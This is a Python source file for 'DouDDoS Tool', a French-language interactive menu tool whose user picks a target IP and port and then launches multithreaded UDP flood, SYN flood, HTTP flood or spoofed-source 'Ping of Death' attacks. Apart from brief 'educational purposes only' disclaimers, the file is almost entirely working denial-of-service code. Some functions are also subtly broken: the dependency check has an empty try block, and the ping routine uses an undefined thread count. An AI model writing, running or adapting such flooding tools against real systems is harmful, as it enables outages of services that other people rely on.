import random
import socket
import string
import sys
import threading
import time
import subprocess
import os
import requests
from scapy.all import *

# Codes ANSI pour les couleurs
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_RESET = "\033[0m"

def print_header():
    print(COLOR_YELLOW + "=" * 40)
    print("     D O U D D O S   T O O L")
    print("=" * 40 + COLOR_RESET)

def clear_terminal():
    if os.name == "posix":  # Pour les systèmes Unix (Linux et macOS)
        os.system("clear")
    else:  # Pour les systèmes Windows
        os.system("cls")

def check_dependencies():
    clear_terminal()
    print_header()
    print(COLOR_GREEN + "[*] Vérification des dépendances..." + COLOR_RESET)
    try:

        print(COLOR_GREEN + "[+] Dépendances installées avec succès." + COLOR_RESET)
    except subprocess.CalledProcessError:
        print(COLOR_RED + "[-] Erreur lors de l'installation des dépendances. Veuillez les installer manuellement." + COLOR_RESET)



def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

# Ajout de couleurs pour la fonction d'attaque UDP Flood
def udp_flood(target_ip, target_port, num_threads, num_packets):
    clear_terminal()
    print_header()
    print(COLOR_CYAN + f"[Attaque UDP Flood] Cible : {target_ip}:{target_port}" + COLOR_RESET)
    print(COLOR_CYAN + f"[Attaque UDP Flood] Threads : {num_threads}, Paquets par thread : {num_packets}" + COLOR_RESET)
    print(COLOR_CYAN + "[Attaque UDP Flood] L'attaque va commencer..." + COLOR_RESET)

    # Fonction pour générer un paquet UDP aléatoire
    def generate_packet(thread_num):
        data = random._urandom(1024)  # Génère des données aléatoires de 1024 octets
        dest_addr = (target_ip, target_port)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(data, dest_addr)
        print(f"[Thread {thread_num}] Paquet UDP envoyé !")

    # Fonction pour lancer une attaque à partir d'un thread
    def launch_attack(thread_num):
        for _ in range(num_packets):
            generate_packet(thread_num)

    # Création des threads pour lancer les attaques
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=launch_attack, args=(i,))
        t.start()
        threads.append(t)

    # Attendre la fin de toutes les attaques
    for t in threads:
        t.join()

    print(COLOR_GREEN + "[Attaque UDP Flood] Attaque terminée." + COLOR_RESET)
    input(COLOR_YELLOW + "Appuyez sur Enter pour revenir au menu..." + COLOR_RESET)

# Ajout de couleurs pour la fonction d'attaque SYN Flood
def syn_flood(target_ip, target_port, num_threads, num_packets):
    clear_terminal()
    print_header()
    print(COLOR_CYAN + f"[Attaque SYN Flood] Cible : {target_ip}:{target_port}" + COLOR_RESET)
    print(COLOR_CYAN + f"[Attaque SYN Flood] Threads : {num_threads}, Paquets par thread : {num_packets}" + COLOR_RESET)
    print(COLOR_CYAN + "[Attaque SYN Flood] L'attaque va commencer..." + COLOR_RESET)

    def run(thread_num):
        source_port = random.randint(1024, 65535)
        i = random.choice(("[*]", "[!]", "[#]"))
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.sendto(b'', (target_ip, target_port))
                print(f"[Thread {thread_num}] Paquet SYN envoyé !")
            except:
                s.close()
                print(COLOR_RED + "[!] Erreur lors de l'envoi du paquet SYN !" + COLOR_RESET)

    all_threads = []
    for i in range(num_threads):
        th = threading.Thread(target=run, args=(i,))
        th.start()
        all_threads.append(th)

    for th in all_threads:
        th.join()

    print(COLOR_GREEN + "[Attaque SYN Flood] Attaque terminée." + COLOR_RESET)
    input(COLOR_YELLOW + "Appuyez sur Enter pour revenir au menu..." + COLOR_RESET)

# Ajout de couleurs pour la fonction d'attaque HTTP Flood
def http_flood(target_ip, target_port, num_threads, num_requests):
    clear_terminal()
    print_header()
    print(COLOR_CYAN + f"[Attaque HTTP Flood] Cible : {target_ip}:{target_port}" + COLOR_RESET)
    print(COLOR_CYAN + f"[Attaque HTTP Flood] Threads : {num_threads}, Requêtes par thread : {num_requests}" + COLOR_RESET)
    print(COLOR_CYAN + "[Attaque HTTP Flood] L'attaque va commencer..." + COLOR_RESET)

    def run(thread_num):
        i = random.choice(("[*]", "[!]", "[#]"))
        url = f"http://{target_ip}:{target_port}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}

        for _ in range(num_requests):
            try:
                response = requests.get(url, headers=headers)
                if response.status_code == 200:
                    print(f"[Thread {thread_num}] Requête HTTP envoyée !")
            except:
                print(COLOR_RED + "[!] Erreur lors de l'envoi de la requête HTTP !" + COLOR_RESET)

    all_threads = []
    for i in range(num_threads):
        th = threading.Thread(target=run, args=(i,))
        th.start()
        all_threads.append(th)

    for th in all_threads:
        th.join()

    print(COLOR_GREEN + "[Attaque HTTP Flood] Attaque terminée." + COLOR_RESET)
    input(COLOR_YELLOW + "Appuyez sur Enter pour revenir au menu..." + COLOR_RESET)

# Ajout de couleurs pour la fonction d'attaque Ping of Death
def ping_of_death(source_ip, target_ip, num_packets, message):
    clear_terminal()
    print_header()
    print(COLOR_CYAN + f"[Attaque Ping of Death] Source IP : {source_ip}, Cible : {target_ip}" + COLOR_RESET)
    print(COLOR_CYAN + f"[Attaque Ping of Death] Paquets : {num_packets}, Message : {message}" + COLOR_RESET)
    print(COLOR_CYAN + "[Attaque Ping of Death] L'attaque va commencer..." + COLOR_RESET)

    def run(thread_num):
        i = random.choice(("[*]", "[!]", "[#]"))
        payload = message.encode() * 60000
        packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload

        for _ in range(num_packets):
            try:
                send(packet)
                print(f"[Thread {thread_num}] Paquet Ping envoyé !")
            except:
                print(COLOR_RED + "[!] Erreur lors de l'envoi du paquet Ping !" + COLOR_RESET)

    all_threads = []
    for i in range(num_threads):
        th = threading.Thread(target=run, args=(i,))
        th.start()
        all_threads.append(th)

    for th in all_threads:
        th.join()

    print(COLOR_GREEN + "[Attaque Ping of Death] Attaque terminée." + COLOR_RESET)
    input(COLOR_YELLOW + "Appuyez sur Enter pour revenir au menu..." + COLOR_RESET)

def find_ip_from_domain():
    clear_terminal()
    print_header()
    print(COLOR_CYAN + "[Recherche de l'adresse IP d'un site]" + COLOR_RESET)
    domain = input("Veuillez entrer le nom de domaine du site : ")

    try:
        ip = socket.gethostbyname(domain)
        print(COLOR_YELLOW + f"L'adresse IP du site {domain} est : {ip}" + COLOR_RESET)
    except socket.gaierror:
        print(COLOR_RED + "Erreur lors de la recherche de l'adresse IP. Veuillez vérifier le nom de domaine." + COLOR_RESET)

    input(COLOR_YELLOW + "Appuyez sur Enter pour revenir au menu..." + COLOR_RESET)

def get_my_info():
    clear_terminal()
    print_header()
    print(COLOR_CYAN + "[About DouDDoS]" + COLOR_RESET)
    print(COLOR_MAGENTA + """The Douddos Tool is an educational Python script that demonstrates Denial-of-Service (DoS) attack techniques. It includes various attack options such as UDP Flood, SYN Flood, HTTP Flood, and Ping of Death.

Usage Warning:
This script is intended for educational purposes only. Unauthorized usage of DoS attacks is illegal and unethical. Use responsibly and with proper authorization.

Disclaimer:
The creators of this script are not responsible for any misuse or illegal activities performed using this tool. Users should use this knowledge ethically and responsibly, respecting the rights and consent of others.""" + COLOR_RESET)


    input(COLOR_YELLOW + "Appuyez sur Enter pour revenir au menu principal..." + COLOR_RESET)

def start_attack():
    check_dependencies()


    while True:
        clear_terminal()
        print_header()
        print(COLOR_RED + "[Menu]" + COLOR_RESET)
        print(COLOR_CYAN + "1) Attaque UDP Flood")
        print("2) Attaque SYN Flood")
        print("3) Attaque HTTP Flood")
        print("4) Attaque Ping of Death")
        print("5) Trouver l'adresse IP d'un site")
        print("0) À propos...")
        print("X) Quitter" + COLOR_RESET)

        choice = input("Choix : ")

        if choice == "1":
            clear_terminal()
            target_ip = input("Veuillez entrer l'adresse IP de la cible : ")
            target_port = int(input("Veuillez entrer le port de la cible : "))
            num_threads = int(input("Veuillez entrer le nombre de threads : "))
            num_packets = int(input("Veuillez entrer le nombre de paquets par thread : "))

            udp_flood(target_ip, target_port, num_threads, num_packets)

        elif choice == "2":
            clear_terminal()
            target_ip = input("Veuillez entrer l'adresse IP de la cible : ")
            target_port = int(input("Veuillez entrer le port de la cible : "))
            num_threads = int(input("Veuillez entrer le nombre de threads : "))
            num_packets = int(input("Veuillez entrer le nombre de paquets par thread : "))

            syn_flood(target_ip, target_port, num_threads, num_packets)

        elif choice == "3":
            clear_terminal()
            target_ip = input("Veuillez entrer l'adresse IP de la cible : ")
            target_port = int(input("Veuillez entrer le port de la cible : "))
            num_threads = int(input("Veuillez entrer le nombre de threads : "))
            num_requests = int(input("Veuillez entrer le nombre de requêtes par thread : "))

            http_flood(target_ip, target_port, num_threads, num_requests)

        elif choice == "4":
            clear_terminal()
            source_ip = input("Veuillez entrer l'adresse IP source : ")
            target_ip = input("Veuillez entrer l'adresse IP de la cible : ")
            num_packets = int(input("Veuillez entrer le nombre de paquets à envoyer : "))
            message = input("Veuillez entrer le message à inclure dans le paquet : ")

            ping_of_death(source_ip, target_ip, num_packets, message)

        elif choice == "5":
            find_ip_from_domain()

        elif choice == "0":
            get_my_info()

        elif choice.upper() == "X":
            clear_terminal()
            print(COLOR_CYAN + "\nMerci d'avoir utilisé Douddos. À bientôt !" + COLOR_RESET)
            sys.exit(0)

        else:
            print(COLOR_RED + "\nChoix invalide. Veuillez réessayer." + COLOR_RESET)

if __name__ == "__main__":
    print_header()
    print(COLOR_MAGENTA + "codé par: Douxx" + COLOR_RESET)
    print(COLOR_RED + "[*] Attention : Ce script est fourni à des fins éducatives uniquement. L'utilisation de ces techniques sans autorisation est illégale." + COLOR_RESET)
    input(COLOR_YELLOW + "\nAppuyez sur Enter pour continuer..." + COLOR_RESET)
    start_attack()
